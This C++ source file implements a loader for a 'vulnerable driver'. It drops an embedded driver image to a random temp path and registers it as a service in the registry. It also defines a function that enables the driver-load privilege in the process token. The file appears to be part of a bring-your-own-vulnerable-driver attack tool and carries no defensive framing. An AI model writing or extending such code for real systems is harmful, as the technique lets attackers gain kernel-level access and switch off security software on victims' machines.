#include "vuln_driver_loader.hpp"

#include "drivers/basic_vuln_driver.hpp"
#include "service_registry.hpp"

#include <print>
#include <utils/fs_utils.hpp>
#include <windows.h>

VulnDriverLoader::VulnDriverLoader(std::unique_ptr<BasicVulnDriver> driver)
    : tempPath(Utils::FS::GenerateRandomTempPath(".tmp"))
    , driver(std::move(driver))
    , registry(std::make_unique<ServiceRegistry>(tempPath))
{
}

VulnDriverLoader::~VulnDriverLoader()
{
}

bool VulnDriverLoader::Load()
{
    if (!Utils::FS::CreateFileFromMemory(tempPath, driver->GetData())) {
        std::println("[-] Failed to create vulnerable driver");
        return false;
    }

    if (!registry->CreateRegistryEntry()) {
        std::println("[-] Failed to create registry entry");
        return false;
    }

    return true;
}

bool VulnDriverLoader::Unload()
{
    if (!registry->DeleteRegistryEntry()) {
        std::println("[-] Failed to delete registry entry");
        return false;
    }


    return true;
}

bool EnableLoadPrivilege()
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::println("[-] Failed to open process token");
        return false;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
        CloseHandle(hToken);
        std::println("[-] Failed to lookup privilege value");
        return false;
    }

    TOKEN_PRIVILEGES tp = { };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        std::println("[-] Failed to adjust token privileges");
        return false;
    }

    CloseHandle(hToken);
    return true;
}
